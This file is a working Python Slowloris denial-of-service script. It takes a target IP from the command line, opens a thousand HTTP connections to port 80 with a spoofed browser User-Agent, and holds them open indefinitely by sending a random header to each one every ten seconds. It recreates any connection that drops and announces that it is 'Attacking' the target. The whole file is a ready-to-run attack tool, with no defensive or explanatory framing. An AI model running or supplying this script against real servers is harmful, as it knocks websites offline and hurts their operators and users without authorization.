#!/opt/homebrew/bin/python3
import random
import socket
import sys
import time

if len(sys.argv) <= 1:
    print('[ERROR] You need to specify the target\'s IP')
    print('Usage: {} [IP]'.format(sys.argv[0]))
    sys.exit(1)

def send_line(self, line):
    line = f"{line}\r\n"
    self.send(line.encode("utf-8"))

def send_header(self, name, value):
    self.send_line(f"{name}: {value}")

list_of_sockets = []
user_agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"

setattr(socket.socket, "send_line", send_line)
setattr(socket.socket, "send_header", send_header)

def init_socket(ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)

    s.connect((ip, 80))

    s.send_line(f"GET /?{random.randint(0, 2000)} HTTP/1.1")

    s.send_header("User-Agent", user_agent)
    s.send_header("Accept-language", "en-US,en,q=0.5")
    return s


def main():
    ip = sys.argv[1]
    socket_count = 1000
    print("Attacking {} with {} sockets.".format(ip, str(socket_count)))
    print("Creating sockets...")
    for _ in range(socket_count):
        try:
            print("Creating socket nr {}".format(str(_)))
            s = init_socket(ip)
        except socket.error as e:
            print(e)
            break
        list_of_sockets.append(s)

    while True:
        try:
            print(
                "Sending keep-alive headers... Socket count: {}".format(
                str(len(list_of_sockets))))
            for s in list(list_of_sockets):
                try:
                    s.send_header("X-a", random.randint(1, 5000))
                except socket.error:
                    list_of_sockets.remove(s)

            for _ in range(socket_count - len(list_of_sockets)):
                print("Recreating socket...")
                try:
                    s = init_socket(ip)
                    if s:
                        list_of_sockets.append(s)
                except socket.error as e:
                    print(e)
                    break
            print("Sleeping for {} seconds".format(str(10)))
            time.sleep(10)

        except (KeyboardInterrupt, SystemExit):
            print("Stopping Slowloris")
            break


if __name__ == "__main__":
    main()
